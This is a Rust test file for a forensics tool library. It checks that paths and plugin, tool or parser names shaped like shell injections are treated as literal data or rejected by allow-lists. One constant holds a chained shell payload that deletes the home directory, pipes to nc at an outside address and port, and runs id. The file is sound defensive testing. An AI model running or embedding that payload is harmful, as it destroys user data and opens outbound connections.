//! Adversarial path-handling tests — the Constraint-Implementation guardrail
//! "no `execute_shell`, typed paths only", exercised at the path boundary.
//!
//! Threat model. Every DFIR tool here is read-only and takes a typed `PathBuf`.
//! None of them build a shell command line: there is no `sh -c` anywhere in the
//! tool surface, and the subprocess tools (Volatility / Hayabusa / tshark / mount)
//! invoke `Command::new(bin).args([...])` with a FIXED argv, so a path is always a
//! single argv element, never re-parsed as a flag or a shell fragment (the
//! `vel_collect` arg-name/artifact-name tests cover that injection boundary). That
//! means there is no execution sink for a malicious path to reach.
//!
//! These tests pin that contract: a path crafted to look like a shell-injection
//! payload, a flag, or a `..` traversal is treated as an ORDINARY filesystem path
//! — the tool either reads exactly that literal file (`case_open`) or returns its
//! typed `NotFound` error (the parsers). No panic, no execution, no flag parsing.
//!
//! Note on traversal: there is deliberately NO path jail. Evidence legitimately
//! lives at arbitrary analyst-chosen absolute paths, and the tools run with the
//! analyst's own privileges, so a `..` path is not a privilege boundary to escape
//! — it simply resolves to a file that is or isn't there. We assert it resolves
//! cleanly to a typed `NotFound` rather than crashing or being interpreted.

use std::fs;
use std::path::PathBuf;
use std::sync::{Mutex, MutexGuard, OnceLock};

use findevil_mcp::{
    case_open, evtx_query, ez_parse, mft_timeline, plaso_parse, prefetch_parse, vol_run,
    CaseOpenInput, EvtxError, EvtxQueryInput, EzParseError, EzParseInput, MftError, MftInput,
    PlasoParseError, PlasoParseInput, PrefetchError, PrefetchInput, VolRunError, VolRunInput,
};

// A path string that would be catastrophic if any tool ever shelled out. Used as
// a filename component, so it must not contain '/' (the only byte illegal in a
// POSIX filename besides NUL). If a shell ever interpreted it, `touch`/`rm`/`nc`
// would run; because nothing shells out, it is an inert sequence of bytes.
const SHELL_PAYLOAD: &str = "evil; touch HACKED && $(rm -rf ~) | nc 10.0.0.1 4444 `id`";

fn env_lock() -> MutexGuard<'static, ()> {
    static LOCK: OnceLock<Mutex<()>> = OnceLock::new();
    LOCK.get_or_init(|| Mutex::new(()))
        .lock()
        .unwrap_or_else(std::sync::PoisonError::into_inner)
}

#[allow(clippy::used_underscore_binding)]
struct HomeGuard {
    prev: Option<String>,
    _lock: MutexGuard<'static, ()>,
}
#[allow(clippy::used_underscore_binding)]
impl HomeGuard {
    fn set(new: &std::path::Path) -> Self {
        let _lock = env_lock();
        let prev = std::env::var("FINDEVIL_HOME").ok();
        std::env::set_var("FINDEVIL_HOME", new);
        Self { prev, _lock }
    }
}
impl Drop for HomeGuard {
    fn drop(&mut self) {
        match &self.prev {
            Some(v) => std::env::set_var("FINDEVIL_HOME", v),
            None => std::env::remove_var("FINDEVIL_HOME"),
        }
    }
}

#[test]
fn case_open_reads_shell_payload_filename_as_a_literal_file() {
    // A real evidence file whose NAME is a shell-injection payload. case_open
    // must hash exactly these bytes — proving the metacharacters are an inert
    // path, not a command.
    let tmp = tempfile::tempdir().expect("tempdir");
    let _home = HomeGuard::set(tmp.path());

    let bytes = b"\x00MFT-ish evidence bytes for a hostile filename";
    let evil = tmp.path().join(format!("{SHELL_PAYLOAD}.e01"));
    fs::write(&evil, bytes).expect("write hostile-named evidence");

    let handle = case_open(&CaseOpenInput {
        image_path: evil,
        expected_sha256: None,
        label: Some("bypass-literal".to_string()),
    })
    .expect("case_open treats the hostile name as a normal file");

    assert_eq!(
        handle.image_size_bytes,
        bytes.len() as u64,
        "hashed exactly the literal file at that path, nothing else"
    );
    assert_eq!(handle.image_hash.len(), 64);
    // The payload's `touch HACKED` never ran: nothing shelled out, so no stray
    // file appeared next to the evidence.
    assert!(
        !tmp.path().join("HACKED").exists(),
        "no shell executed the payload"
    );
}

#[test]
fn evtx_query_treats_shell_payload_path_as_missing_file() {
    let tmp = tempfile::tempdir().expect("tempdir");
    let missing = tmp.path().join(format!("{SHELL_PAYLOAD}.evtx"));

    let err = evtx_query(&EvtxQueryInput {
        case_id: "c".to_string(),
        evtx_path: missing,
        eids: None,
        xpath: None,
        limit: None,
    })
    .expect_err("a non-existent hostile path must error, not execute");

    assert!(matches!(err, EvtxError::EvtxNotFound(_)));
    assert!(!tmp.path().join("HACKED").exists());
}

#[test]
fn prefetch_parse_treats_traversal_path_as_missing_file() {
    // A `..` traversal to a non-existent file resolves cleanly to NotFound — no
    // panic, no jail to escape (the tool runs as the analyst already).
    let tmp = tempfile::tempdir().expect("tempdir");
    let traversal: PathBuf = tmp
        .path()
        .join("..")
        .join("..")
        .join("..")
        .join("nonexistent-EVIL.pf");

    let err = prefetch_parse(&PrefetchInput {
        case_id: "c".to_string(),
        prefetch_path: traversal,
    })
    .expect_err("traversal to a missing file must be a clean typed error");

    assert!(matches!(err, PrefetchError::NotFound(_)));
}

#[test]
fn vol_run_rejects_shell_payload_plugin_before_any_subprocess() {
    // vol_run is the one parameterized verb whose argument (the plugin name)
    // reaches argv. The allow-list is its injection boundary: a plugin string
    // shaped like a shell payload is not on the list, so it is rejected with a
    // typed PluginNotAllowed BEFORE any path check or subprocess spawn — even
    // pointing at a real file. No `windows.cmdline` plugin ever runs.
    let tmp = tempfile::tempdir().expect("tempdir");
    let real = tmp.path().join("image.mem");
    fs::write(&real, b"not really a memory image").expect("write");

    let err = vol_run(&VolRunInput {
        case_id: "c".to_string(),
        memory_path: real,
        plugin: format!("windows.cmdline; {SHELL_PAYLOAD}"),
        pid: None,
        limit: None,
    })
    .expect_err("a shell-payload plugin string must be rejected, not executed");

    assert!(
        matches!(err, VolRunError::PluginNotAllowed(_)),
        "got {err:?}"
    );
    assert!(!tmp.path().join("HACKED").exists(), "no shell executed");
}

#[test]
fn ez_parse_rejects_shell_payload_tool_before_any_subprocess() {
    // ez_parse's `tool` parameter selects the binary. The allow-list is the
    // injection boundary: a tool string shaped like a shell payload is not on
    // the list, so it is rejected with ToolNotAllowed BEFORE any path check or
    // subprocess — even pointing at a real file. No EZ binary ever runs.
    let tmp = tempfile::tempdir().expect("tempdir");
    let real = tmp.path().join("evil.lnk");
    fs::write(&real, b"not really a lnk").expect("write");

    let err = ez_parse(&EzParseInput {
        case_id: "c".to_string(),
        tool: format!("lecmd; {SHELL_PAYLOAD}"),
        artifact_path: real,
        limit: None,
    })
    .expect_err("a shell-payload tool string must be rejected, not executed");

    assert!(
        matches!(err, EzParseError::ToolNotAllowed(_)),
        "got {err:?}"
    );
    assert!(!tmp.path().join("HACKED").exists(), "no shell executed");
}

#[test]
fn plaso_parse_rejects_shell_payload_parser_before_any_subprocess() {
    // plaso_parse's `parser` parameter reaches argv. The allow-list is the
    // injection boundary: a parser string shaped like a shell payload is not on
    // the list, so it is rejected with ParserNotAllowed BEFORE any path check or
    // subprocess — even pointing at a real file. No plaso stage ever runs.
    let tmp = tempfile::tempdir().expect("tempdir");
    let real = tmp.path().join("auth.log");
    fs::write(&real, b"Jun 13 sshd login").expect("write");

    let err = plaso_parse(&PlasoParseInput {
        case_id: "c".to_string(),
        parser: format!("syslog; {SHELL_PAYLOAD}"),
        artifact_path: real,
        limit: None,
    })
    .expect_err("a shell-payload parser string must be rejected, not executed");

    assert!(
        matches!(err, PlasoParseError::ParserNotAllowed(_)),
        "got {err:?}"
    );
    assert!(!tmp.path().join("HACKED").exists(), "no shell executed");
}

#[test]
fn mft_timeline_treats_flag_looking_path_as_a_literal_path() {
    // A path that looks like a CLI flag is a path, not a flag — these tools never
    // forward it to argv parsing, and a missing one is a typed NotFound.
    let tmp = tempfile::tempdir().expect("tempdir");
    let flaggy = tmp.path().join("--output=__rooted__ -rf .mft");

    let err = mft_timeline(&MftInput {
        case_id: "c".to_string(),
        mft_path: flaggy,
        since_iso: None,
        until_iso: None,
        limit: None,
    })
    .expect_err("flag-looking missing path must be a clean typed error");

    assert!(matches!(err, MftError::MftNotFound(_)));
}
